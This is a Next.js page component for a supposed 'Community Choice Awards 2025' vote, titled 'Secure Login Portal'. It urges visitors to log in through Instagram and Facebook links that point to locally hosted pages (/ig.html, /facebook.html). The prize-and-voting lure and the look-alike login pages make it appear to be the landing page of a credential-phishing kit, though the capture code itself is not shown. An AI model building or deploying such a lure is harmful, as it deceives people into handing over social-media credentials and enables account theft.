import { useState, useEffect } from 'react';
import Head from 'next/head';
import Link from 'next/link';
import { useRouter } from 'next/router';
import styles from '../styles/Home.module.css';
import fs from 'fs';
import path from 'path';

// This gets called at build time
export async function getStaticProps() {
  const filePath = path.join(process.cwd(), 'public', 'index.html');
  const htmlContent = fs.readFileSync(filePath, 'utf8');
  
  return {
    props: {
      htmlContent
    }
  };
}

export default function Home() {
  const router = useRouter();
  const [loading, setLoading] = useState(false);
  
  useEffect(() => {
    const handleRouteChange = () => {
      setLoading(true);
    };

    router.events.on('routeChangeStart', handleRouteChange);
    return () => {
      router.events.off('routeChangeStart', handleRouteChange);
    };
  }, [router]);

  return (
    <div className={styles.container}>
      <Head>
        <title>Secure Login Portal</title>
        <meta name="description" content="Secure login portal for multiple platforms" />
        <link rel="icon" href="/assets/facebook.svg" />
        <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600;700&display=swap" rel="stylesheet" />
      </Head>

      <main className={styles.main}>
        <h1 className={styles.title}>
          Community Choice Awards 2025
        </h1>

        <p className={styles.description}>
          Please login to cast your vote
        </p>

        <div className={styles.grid}>
          <Link href="/ig.html" className={styles.card}>
            <div>
              <h2>Instagram Login &rarr;</h2>
              <p>Vote using your Instagram account.</p>
              <div className={styles.iconContainer}>
                <img src="/assets/instagram-icon.svg" alt="Instagram Icon" className={styles.icon} />
              </div>
            </div>
          </Link>

          <Link href="/facebook.html" className={styles.card}>
            <div>
              <h2>Facebook Login &rarr;</h2>
              <p>Vote using your Facebook account.</p>
              <div className={styles.iconContainer}>
                <img src="/assets/facebook.svg" alt="Facebook Icon" className={styles.icon} />
              </div>
            </div>
          </Link>
        </div>

        <div className={styles.infoSection}>
          <h3>About the Community Choice Awards</h3>
          <p>The annual Community Choice Awards celebrate the best creators and influencers as voted by you, the community.</p>
          
          <div className={styles.featuresGrid}>
            <div className={styles.featureCard}>
              <div className={styles.featureIcon}>🏆</div>
              <h4>Vote for Your Favorites</h4>
              <p>Support your favorite creators in multiple categories</p>
            </div>
            
            <div className={styles.featureCard}>
              <div className={styles.featureIcon}>🌟</div>
              <h4>Exclusive Content</h4>
              <p>Get access to behind-the-scenes content from nominees</p>
            </div>
            
            <div className={styles.featureCard}>
              <div className={styles.featureIcon}>🎁</div>
              <h4>Win Prizes</h4>
              <p>Voters are entered into a draw for exclusive merchandise</p>
            </div>
          </div>
        </div>
      </main>

      <footer className={styles.footer}>
        <p>© 2025 Community Choice Awards - All rights reserved</p>
      </footer>
    </div>
  );
} 